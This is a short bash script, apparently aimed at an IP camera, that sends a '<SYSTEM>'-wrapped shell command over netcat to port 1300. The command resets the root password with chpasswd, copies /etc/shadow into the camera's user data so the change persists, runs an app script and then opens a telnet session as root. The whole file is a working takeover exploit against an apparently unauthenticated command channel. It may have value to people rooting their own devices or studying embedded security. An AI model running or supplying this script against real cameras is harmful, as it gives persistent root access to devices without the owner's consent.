#!/bin/bash
ip="${1:-ipcam1}"
port="${2:-1300}"
new_password="${3:-root}"
echo "Permenantly changing root password to $new_password"
response=$(echo "<SYSTEM>echo \"root:$new_password\" | chpasswd; cp /etc/shadow /app/userdata/shadow; cd /app; /app/app_shadow.sh </SYSTEM>" | nc "$ip" "$port");
echo "$response"
#echo "Waiting for camera to restart"
#sleep 30
echo "Trying to telnet to device" 
echo "  user:root password:$new_password"
telnet $ip 
